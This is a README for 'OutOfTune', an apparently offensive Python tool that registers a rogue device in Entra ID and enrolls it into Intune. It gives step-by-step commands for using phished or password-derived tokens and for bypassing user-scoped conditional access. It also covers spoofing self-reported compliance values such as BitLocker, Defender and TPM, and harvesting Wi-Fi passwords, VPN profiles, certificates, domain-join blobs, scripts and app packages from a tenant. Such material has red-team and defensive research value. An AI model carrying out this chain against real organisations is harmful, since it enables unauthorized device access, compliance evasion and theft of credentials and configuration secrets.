# OutOfTune

Inspired by the original Pytune, OutOfTune registers a rogue device in Entra ID, enrolls it into Intune MDM, and checks the resulting compliance state.

---

## Requirements

```
pip install -r requirements.txt
```

Dependencies: `requests`, `pyjwt`, `cryptography`, `roadlib`, `xmltodict`, `asn1crypto`

---

## How it works

The chain runs in phases, each building on state saved to `chain_state.json`.

```
drs-token  ->  device-join  ->  device-token  ->  mdm-enroll  ->  mdm-checkin
```

1. **drs-token** - get a DRS access token (ROPC or pre-phished)
2. **device-join** - register a new device object in Entra ID, get a device cert
3. **device-token** - authenticate as the device principal, get an Intune enrollment token
4. **mdm-enroll** - SOAP discovery + WS-Trust enrollment, get an MDM client cert
5. **mdm-checkin** - OMA-DM SyncML checkin, pull policies, optionally set a primary user

---

## Usage

### 1. Get a DRS token

ROPC (credentials known):
```
python OutOfTune.py drs-token -u user@domain.com -p Password1!
```

Pre-obtained token (phished session via cookie_inject.py):
```
python OutOfTune.py drs-token -u user@domain.com -t <drs_access_token>
```

---

### 2. Join a device to Entra ID

```
python OutOfTune.py device-join
python OutOfTune.py device-join -n CORP-LAPTOP-01
```

Outputs `<DEVICENAME>.pfx` - the device certificate. Password is `password`.

---

### 3. Get a device principal token

```
python OutOfTune.py device-token
python OutOfTune.py device-token --cert CORP-LAPTOP-01.pfx
```

Authenticates to AAD as the device object (not as a user). Bypasses user-scoped CA policies.

---

### 4. Enroll into Intune MDM

```
python OutOfTune.py mdm-enroll
python OutOfTune.py mdm-enroll --profile profiles/dell_win11_ent.json
```

Runs SOAP discovery against the MDM endpoint, then submits a WS-Trust PKCS10 enrollment request. Outputs `<DEVICENAME>_mdm.pfx`.

Use `--profile` to spoof device hardware/OS attributes sent to Intune (see [Device Profiles](#device-profiles)).

---

### 5. OMA-DM checkin

```
python OutOfTune.py mdm-checkin
python OutOfTune.py mdm-checkin -r <refresh_token>
python OutOfTune.py mdm-checkin --cert CORP-LAPTOP-01_mdm.pfx
python OutOfTune.py mdm-checkin -O ./output
python OutOfTune.py mdm-checkin -O ./output --save-syncml ./output/raw
```

Runs the OMA-DM SyncML loop against `r.manage.microsoft.com`. Intune will push configuration profiles, app assignments, and any other policies targeting the device. After the loop completes, intelligence is automatically extracted and displayed.

If `-r` is supplied, the refresh token is exchanged for a `manage.microsoft.com` access token and sent as `Authorization: Bearer` in each SyncML request. Intune reads the UPN from this token and sets it as the device's primary user, causing user-scoped compliance policies to bind. You only need to run once with `-r` for a user to be assigned, all subsequent checkins can be run without a refresh token.

Without `-r` the device will have no primary user.

After this initial checkin, if you do not check in again for an extended period of time (usually 5-7 days) the device might fall out of compliance due to the default policy for "Is Active". Depending on the configuration of Intune the device may enter a grace period before being marked as non-compliant. If this happens re-run `mdm-checkin`. If you have previously used a refresh token to assign a primary user, this does not have to be submitted again as the primary user is now stored within the Intune backend.

#### Flags

| Flag | Description |
|---|---|
| `--cert FILE` | MDM PFX to use — device name derived from filename automatically |
| `-r RT` | User refresh token — sets primary user (only needed once) |
| `-O DIR` | Save extracted artefacts to DIR (`wifi/`, `vpn/`, `scripts/`, `certs/`, `add_values.json`, `policy_values.json`) |
| `--save-syncml DIR` | Save raw SyncML XML per round to DIR for offline re-parsing |
| `-o FILE` | Write full console output to FILE |

#### Extracted intelligence

| Category | Saved to | Notes |
|---|---|---|
| Wi-Fi profiles | `wifi/<SSID>.xml` + `_psk.txt` | Plaintext PSK extracted if present |
| VPN profiles | `vpn/<name>.xml` | Full ProfileXML |
| Certificate payloads | `certs/cert_N.b64` | Encrypted PFX blobs (raw, not yet decrypted) |
| SCEP challenges | displayed | CA model name, challenge URL |
| Scripts | `scripts/<name>.ps1` | PowerShell scripts pushed via OMA-DM |
| MSI download URLs | displayed | Direct CDN links for LOB apps |
| ODJ blob | `odj_blob.b64` + `odj_strings.txt` | Offline Domain Join — readable strings extracted |
| Add values | `add_values.json` | All other Add commands (Root CA certs, MDE onboarding, policy config) |
| Replace values | `policy_values.json` | Policy CSP values set by Intune |

---

### Parse saved SyncML rounds

Re-parse raw XML rounds saved with `--save-syncml` without running a live checkin.

```
python OutOfTune.py parse-checkin --dir ./output/raw -O ./output2
python OutOfTune.py parse-checkin --file ./output/raw/round_001.xml -O ./output2
```

---

### Check compliance state

```
python OutOfTune.py check -u user@domain.com -r <refresh_token>
python OutOfTune.py check -u user@domain.com -p Password1!
```

Mints a PRT from the device cert, exchanges it for an IWService token, and queries `IWService/Devices` for the device's compliance state and any non-compliant rules.

Use `-r` with an MFA-session refresh token if the tenant CA requires MFA for the enrollment resource.

---

### Download apps and scripts

Fetches Win32 apps and PowerShell scripts assigned to the device via the IME SideCarGateway. Uses the MDM client certificate only — no user token required.

```
python OutOfTune.py download-apps
python OutOfTune.py download-apps --cert CORP-LAPTOP-01_mdm.pfx
```

- PowerShell scripts are saved to `scripts/<PolicyId>.ps1`
- Win32 apps are downloaded from the CDN, decrypted, and extracted to `apps/<AppName>/`

---

### Download remediation scripts

Fetches proactive remediation scripts (detection + remediation pairs) assigned to the device.

```
python OutOfTune.py get-remediations
python OutOfTune.py get-remediations --cert CORP-LAPTOP-01_mdm.pfx
```

Each policy is saved to `remediations/<PolicyId>/` containing:
- `detection.ps1` — the detection script
- `remediation.ps1` — the remediation script
- `params.json` — policy ID and any script parameters

---

### Cleanup

Remove the device from Intune:
```
python OutOfTune.py retire-intune -u user@domain.com -r <refresh_token>
```

Remove the device object from Entra ID:
```
python OutOfTune.py entra-delete
```

---

### Check chain progress

```
python OutOfTune.py status
```

---

## Device Profiles

Device attributes sent to Intune during enrollment and checkin are fully spoofable via a JSON profile. This includes hardware identifiers, OS version, manufacturer, and all self-reported compliance CSP values (BitLocker, Firewall, Defender, TPM, Secure Boot).

```
python OutOfTune.py mdm-enroll --profile profiles/dell_win11_ent.json
python OutOfTune.py mdm-checkin   # profile is saved to state and reused automatically
```

### Included profiles

| File | Device |
|---|---|
| `profiles/default.json` | Default values (VMware / Win10 Enterprise) |
| `profiles/dell_win11_ent.json` | Dell Latitude 5540 / Windows 11 Enterprise 23H2 |

### Profile fields

| Field | CSP | Notes |
|---|---|---|
| `os_version` | `DevDetail/SwV` | Min/max OS version compliance checks |
| `os_edition_syncml` | `WindowsLicensing/Edition` | 4 = Enterprise, 48 = Pro |
| `manufacturer` | `DevInfo/Man` | Some policies allowlist manufacturers |
| `mac_address` | SOAP `AdditionalContext/MAC` | All-zeros is an obvious indicator |
| `hw_dev_id_enroll` | SOAP `AdditionalContext/HWDevID` | 64 hex chars |
| `bitlocker_status` | `BitLocker/Status/DeviceEncryptionStatus` | 2 = encrypted (self-reported) |
| `encryption_compliance` | `DeviceStatus/Compliance/EncryptionCompliance` | 1 = compliant (self-reported) |
| `firewall_status` | `DeviceStatus/Firewall/Status` | 0 = on (self-reported) |
| `secure_boot_state` | `DeviceStatus/SecureBootState` | 1 = enabled (self-reported, not HAS-attested) |
| `tpm_version` | `DeviceStatus/TPM/SpecificationVersion` | No cryptographic proof |
| `defender_enabled` | `Defender/Health/DefenderEnabled` | true = running |
| `defender_version` | `Defender/Health/DefenderVersion` | Some policies enforce minimum version |

All DeviceStatus CSP values are self-reported and trusted by Intune without independent verification. HAS-attested compliance checks (BitLockerEnabled, SecureBootEnabled via HealthAttestation CSP) require a real TPM and cannot be spoofed this way.

---

## Global flags

```
--debug          verbose HTTP + token logging
--proxy <url>    route traffic through a proxy (e.g. http://127.0.0.1:8080)
```

These go before the command:
```
python OutOfTune.py --debug device-token
python OutOfTune.py --proxy http://127.0.0.1:8080 mdm-checkin
```

---

## Certificate overrides

If you have certs from a previous run or want to use specific PFX files:

```
python OutOfTune.py device-token      --cert path/to/device.pfx
python OutOfTune.py mdm-enroll        --cert path/to/device.pfx
python OutOfTune.py mdm-checkin       --cert path/to/mdm.pfx
python OutOfTune.py check             --cert path/to/device.pfx
python OutOfTune.py download-apps     --cert path/to/mdm.pfx
python OutOfTune.py get-remediations  --cert path/to/mdm.pfx
```

---

## State file

All phase outputs are saved to `chain_state.json` in the working directory. Delete it to start fresh. Use `status` to inspect current state without running anything. If you are dealing with multiple devices make sure they each have their own state file. The default state file can be changed at the start of the script to which ever device you are messing with.
